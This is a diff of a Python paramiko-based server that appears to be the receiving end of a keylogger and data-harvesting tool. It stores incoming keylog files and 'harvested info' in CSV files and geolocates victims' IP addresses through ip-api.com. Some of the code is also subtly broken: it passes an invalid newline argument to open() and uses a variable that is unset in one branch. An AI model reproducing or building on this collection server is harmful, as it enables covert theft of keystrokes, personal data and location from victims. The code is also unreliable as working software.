@@ -356,18 +356,32 @@ def handle(conn): #
     logger.info("Client said this ->" + str(request))
     print("Client said this ->" + str(request))
     print(str(request))
+    
+    #we check to see if were being sent the keylogged data or a string that the user entered
+    #if its a string from the user, we add it to a csv with all other harvested info
     if request=='infobank.txt':
         print("recieved bank.txt")
         info=chan.recv(1024).decode('utf-8')
+        
         seperated=info.split(',')
-        with open('dosthiswork.csv', 'a',  newline='') as writer:
+        with open('dosthiswork.csv', 'a',  newline='|') as writer:
             writer.write(info)
-    elif request=='keylog.txt':
+        response=requests.get("http://ip-api.com/json/%s"%(seperated[6]))
+        if  response.status_code==200:#if ip-api runs successfully save the results into another csv
+            txt=json.dumps(response.json())
+            print(txt)
+            with open('moreInfo.csv', 'a',  newline='') as writer:
+                    writer.write(txt)
+    elif request=='keylog.txt':#if its a keylogged file just accept the file
         chan.recv(2048)
-    response=requests.get("http://ip-api.com/json/%s"%(seperated[5]))
-    print(response.status_code)
-    txt=json.dumps(response.json())
-    print(txt)
+        
+    #use ip-api.com's api to look up ip address and harvest more info like latitude/longitude
+    response=requests.get("http://ip-api.com/json/%s"%(seperated[6]))
+    if  response.status_code==200:#if ip-api runs successfully save the results into another csv
+        txt=json.dumps(response.json())
+        print(txt)
+        with open('moreInfo.csv', 'a',  newline='') as writer:
+                writer.write(txt)
     #signUp(data1[i])
     print("Done!")
     try:
@@ -376,8 +390,7 @@ def handle(conn): #
         pass
         
     return 0
-    
-    
+
 class Server (paramiko.ServerInterface):
     host_key = paramiko.RSAKey(filename='test_rsa.key')
     def _init_(self):
